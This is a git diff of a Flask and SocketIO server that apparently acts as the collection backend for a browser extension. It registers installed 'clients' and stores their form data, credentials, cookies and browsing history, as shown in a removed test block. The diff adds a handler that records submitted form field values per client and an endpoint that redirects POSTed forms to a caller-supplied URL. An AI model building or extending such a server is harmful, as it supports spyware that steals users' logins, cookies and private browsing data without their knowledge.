@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, redirect
 from flask_socketio import SocketIO, emit, send 
 from . import database
 import json, os
@@ -18,13 +18,6 @@ Server responses to client: (int status, data) as tuple
 http status code, data
 """
 
-def messageReceived(methods=['Get', 'Post']):
-    print('message was received!!!')
-
-@socketio.on('my event')
-def handle_my_custom_event(json, methods=['Get', 'Post']):
-    print('received my event: ' + str(json))
-    socketio.emit('my response', json, callback=messageReceived)
 
 @socketio.on('connect', namespace='/socket.io')
 def handle_ext_connect():
@@ -55,7 +48,6 @@ def handle_ext_ping(data):
         clientid = database.create_new_client(data)
         connected_clients.append((clientid, request.sid))
         resp = database.construct_response(clientid)
-        #emit('srvpayload', resp, room=request.sid)
         emit('newClientInstall', clientid, namespace ="/socket.io", broadcast=True)
         return resp
     else:
@@ -79,7 +71,19 @@ def handle_ext_ping(data):
                 return bad
         emit('json', database.construct_response(clientid), room=request.sid)
 
-
+@socketio.on('submit')
+def handle_form_id_mappings_submit(mappings, url):
+    print("processing new form mappings")
+    data = [{}]
+    data[0].update({"url":url})
+    for x in mappings:
+        remoteDef = x["key"]
+        value = x["value"]
+        localDef = x["LocalDef"]
+        clientid = x["id"]
+        database.store_form_id_mappings(url, localDef, remoteDef)
+        data[0].update({remoteDef:value})
+    database.store_form_data(data[0], clientid)
 
 def do_pong(clientid, payload):
     sid = [(clientidx, sid) for (clientidx, sid) in connected_clients if clientidx == clientid].pop(0)[1] or None
@@ -108,14 +112,11 @@ def validate_payload(data):
         return 0
     return 1
 
+
+@app.route('/submitform', methods=['POST'])
+def submit_form():
+    return redirect(request.form['formurl'])
+
+
 if __name__ == "__main__":
-    with open("../sample_ext_to_srv.json") as f:
-        clientid = 123
-        data = json.load(f)
-        #database.store_form_data(data["forms"][0], clientid)
-        #database.store_credential(data["creds"][0], clientid)
-        #database.store_cookie(data["cookies"][0], clientid)
-        database.store_history(data["history"], clientid)
-        #database.create_new_client(data)
-        #database.construct_response(clientid)
     socketio.run(app, debug=True, use_reloader=False)
